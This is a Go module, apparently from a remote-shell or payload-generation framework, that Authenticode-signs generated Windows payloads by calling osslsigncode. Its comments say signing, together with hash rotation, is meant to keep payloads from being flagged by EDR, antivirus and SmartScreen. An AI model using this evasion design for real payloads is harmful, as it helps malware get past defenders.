// Package signing 为生成的 Windows 载荷做 Authenticode 代码签名（可选）。
//
// 为什么需要：未签名的 EXE 是被 EDR/AV 与 Windows SmartScreen 直接标记的特征，
// 而"每次生成的模板都一样"这件事已经通过 HashPad 缓解（静态 hash 轮换），
// 签名解决的是另一件事 —— 让载荷看起来来自有证书的主体。
//
// 实现刻意保持**外部命令**形态（默认 osslsigncode，Windows 上也可换 signtool）：
//   - 不把 PKCS#12 解析/签名逻辑拉进服务端依赖（体积与审计面）；
//   - 命令行模板可配置，厂商工具链不同也能适配；
//   - 唯一硬约束是"读 {{in}}、写 {{out}}"，行为可以单测（用假签名器）。
//
// 安全注意：密码以命令行参数传给外部工具，签名期间会出现在本机进程列表里。
// 建议为载荷签名使用**专用证书**，不要复用主证书。
package signing

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// DefaultCommand 默认签名器（Linux/Windows 均可装的 osslsigncode）
const DefaultCommand = "osslsigncode"

// defaultArgs osslsigncode 的签名参数；占位符由 Sign 替换
var defaultArgs = []string{
	"sign",
	"-pkcs12", "{{pfx}}",
	"-pass", "{{password}}",
	"-in", "{{in}}",
	"-out", "{{out}}",
}

// Config 签名配置（来自 config.yaml 的 signing 段）
type Config struct {
	Enabled  bool
	Command  string   // 默认 osslsigncode
	Args     []string // 自定义参数模板；空则用 osslsigncode 默认
	PFX      string   // PKCS#12 证书路径
	Password string
	Timeout  time.Duration
}

var (
	mu     sync.RWMutex
	global Config
)

// Configure 设置全局签名配置（main 启动时调用一次）
func Configure(cfg Config) {
	if strings.TrimSpace(cfg.Command) == "" {
		cfg.Command = DefaultCommand
	}
	if cfg.Timeout <= 0 {
		cfg.Timeout = 60 * time.Second
	}
	mu.Lock()
	global = cfg
	mu.Unlock()
}

// Current 返回当前配置（测试用）
func Current() Config {
	mu.RLock()
	defer mu.RUnlock()
	return global
}

// Enabled 是否启用了签名
func Enabled() bool {
	mu.RLock()
	defer mu.RUnlock()
	return global.Enabled
}

// Validate 启动时校验：启用签名却缺证书属于配置错误，必须显式失败。
func Validate(cfg Config) error {
	if !cfg.Enabled {
		return nil
	}
	if strings.TrimSpace(cfg.Command) == "" {
		return errors.New("signing.command 为空")
	}
	if strings.TrimSpace(cfg.PFX) == "" {
		return errors.New("signing.enabled=true 但未配置 signing.pfx（PKCS#12 证书路径）")
	}
	if _, err := os.Stat(cfg.PFX); err != nil {
		return fmt.Errorf("signing.pfx 不可读: %w", err)
	}
	if _, err := exec.LookPath(cfg.Command); err != nil {
		return fmt.Errorf("找不到签名命令 %q（请安装 osslsigncode 或配置 signing.command）: %w", cfg.Command, err)
	}
	return nil
}

// Sign 对 PE 字节签名。未启用时原样返回（调用方无需分支）。
//
// 失败**不吞**：启用了签名却签不出来，应该让载荷生成失败，而不是悄悄发一个未签名文件。
func Sign(data []byte) ([]byte, error) {
	mu.RLock()
	cfg := global
	mu.RUnlock()
	if !cfg.Enabled {
		return data, nil
	}

	dir, err := os.MkdirTemp("", "tshell-sign-")
	if err != nil {
		return nil, fmt.Errorf("创建签名临时目录失败: %w", err)
	}
	defer func() { _ = os.RemoveAll(dir) }()

	in := filepath.Join(dir, "in.exe")
	out := filepath.Join(dir, "out.exe")
	if err := os.WriteFile(in, data, 0o600); err != nil {
		return nil, fmt.Errorf("写入待签名文件失败: %w", err)
	}

	args := cfg.Args
	if len(args) == 0 {
		args = defaultArgs
	}
	subst := func(s string) string {
		r := strings.NewReplacer(
			"{{in}}", in,
			"{{out}}", out,
			"{{pfx}}", cfg.PFX,
			"{{password}}", cfg.Password,
		)
		return r.Replace(s)
	}
	cmdArgs := make([]string, len(args))
	for i, a := range args {
		cmdArgs[i] = subst(a)
	}

	timeout := cfg.Timeout
	if timeout <= 0 {
		timeout = 60 * time.Second
	}
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, cfg.Command, cmdArgs...)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		tail := strings.TrimSpace(stderr.String())
		if len(tail) > 600 {
			tail = tail[len(tail)-600:]
		}
		return nil, fmt.Errorf("%s 执行失败: %v（%s）", cfg.Command, err, tail)
	}

	signed, err := os.ReadFile(out)
	if err != nil {
		return nil, fmt.Errorf("签名输出不存在（参数必须把 {{out}} 写到文件）: %w", err)
	}
	if len(signed) == 0 {
		return nil, errors.New("签名输出为空")
	}
	return signed, nil
}
